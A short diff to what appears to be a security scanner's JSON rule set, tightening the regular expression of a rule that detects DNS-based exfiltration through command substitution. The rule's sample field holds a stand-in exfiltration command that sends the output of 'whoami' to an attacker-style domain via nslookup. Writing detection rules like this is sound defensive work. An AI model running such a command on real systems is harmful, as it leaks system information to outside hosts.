@@ -259,7 +259,7 @@
       "id": "exfil.dns",
       "category": "exfil",
       "severity": "medium",
-      "pattern": "(?:nslookup|dig|host)\\b[^\\n]*\\$\\(",
+      "pattern": "(?<![\\w-])(?:nslookup|dig|host)\\s[^\\n]*\\$\\(",
       "description": "DNS lookup of a command-substituted value (DNS exfiltration).",
       "remediation": "Remove the DNS-based exfiltration.",
       "sample": "nslookup $(whoami).attacker.example"
